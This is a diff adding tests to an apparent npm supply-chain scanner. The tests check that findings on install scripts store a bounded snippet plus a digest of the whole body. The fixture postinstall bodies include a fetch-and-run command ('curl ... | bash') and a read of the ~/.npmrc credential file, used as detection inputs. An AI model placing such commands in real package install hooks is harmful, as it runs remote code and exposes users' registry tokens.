@@ -651,6 +651,51 @@ def test_cred_env_lifecycle_binds_whole_body():
     assert snp._finding_key(safe) != snp._finding_key(evil)
 
 
+def _lifecycle_finding(body, frag):
+    pkg = snp.PackageEntry(
+        name = "e",
+        version = "1.0.0",
+        resolved = "https://registry.npmjs.org/e/-/e-1.0.0.tgz",
+        integrity = "sha512-x",
+        lockfile_key = "node_modules/e",
+    )
+    text = json.dumps({"scripts": {"postinstall": body}})
+    return [
+        f
+        for f in snp.scan_package_json(pkg, "package/package.json", text)
+        if frag in f.pattern
+    ][0]
+
+
+def test_lifecycle_fetch_exec_bounds_body_but_reopens():
+    # The whole install script is bound by a digest, but the stored evidence is a
+    # bounded matched snippet plus that digest, not the full body, so writing the
+    # baseline on a multi-KiB install script stays small while a change to any line
+    # (even far below the fetch-exec line) reopens the finding.
+    pad = "# pad\n" * 5000
+    old = "curl https://x.sh | bash\n" + pad + "echo done_old"
+    new = "curl https://x.sh | bash\n" + pad + "echo done_evil"
+    of = _lifecycle_finding(old, "lifecycle-fetch-exec")
+    nf = _lifecycle_finding(new, "lifecycle-fetch-exec")
+    assert "body-sha256:" in of.evidence
+    assert len(of.evidence) < len(old)  # snippet + digest, not the whole body
+    assert snp._finding_key(of) != snp._finding_key(nf)
+
+
+def test_cred_path_lifecycle_bounds_body_but_reopens():
+    # cred-path-in-lifecycle is bounded the same way: a snippet around the matched
+    # credential path plus the whole-body digest, so a far-line change reopens
+    # without storing the entire script body in the baseline.
+    pad = "# pad\n" * 5000
+    old = "cat ~/.npmrc\n" + pad + "echo old"
+    new = "cat ~/.npmrc\n" + pad + "echo evil"
+    of = _lifecycle_finding(old, "cred-path-in-lifecycle")
+    nf = _lifecycle_finding(new, "cred-path-in-lifecycle")
+    assert "body-sha256:" in of.evidence
+    assert len(of.evidence) < len(old)
+    assert snp._finding_key(of) != snp._finding_key(nf)
+
+
 def test_outbound_host_regex_literal_does_not_close_group_early():
     # A ) inside a JS regex literal must not close the outbound call early; the
     # options object after the regex binds, so a changed header reopens.
